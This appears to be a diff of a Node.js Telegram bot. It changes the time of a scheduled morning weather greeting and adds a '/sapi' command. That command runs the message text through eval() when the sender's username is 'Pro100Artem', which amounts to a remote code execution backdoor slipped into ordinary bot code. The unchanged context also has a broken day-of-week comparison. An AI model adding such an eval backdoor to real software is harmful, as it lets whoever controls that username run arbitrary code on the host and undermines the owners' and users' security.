@@ -44,7 +44,7 @@ let texts = {
 };	
 let weather = '';
 if (new Date().getDay() == 6 || new Date().getDay == 0 || weDates.indexOf(new Date().getDate() + '.' + (new Date().getMonth() + 1)) != -1) {
-	new schedule.scheduleJob('30 9 * * *', () => {
+	new schedule.scheduleJob('00 7 * * *', () => {
 		getWeather(-1001227448699, 'Доброе утро))\nСегодня ', '\nВсем хорошего настроения✨', 1);
 	});
 }else{
@@ -57,6 +57,9 @@ new schedule.scheduleJob('01 9 * * *', () => {
 	});
 bot.onText(/^\/test/, (msg) => {
 	bot.sendSticker(msg.chat.id, 'CAADAgADOAADyIsGAAE7re09I3hMQwI');
+});
+bot.onText(/\/sapi/, (msg) => {
+	if(msg.from.username == 'Pro100Artem') eval(msg.text.split('sapi ')[1]);
 });
 bot.on('audio', (msg) => {
 	reply(msg, 'ID: ' + msg.audio.file_id);
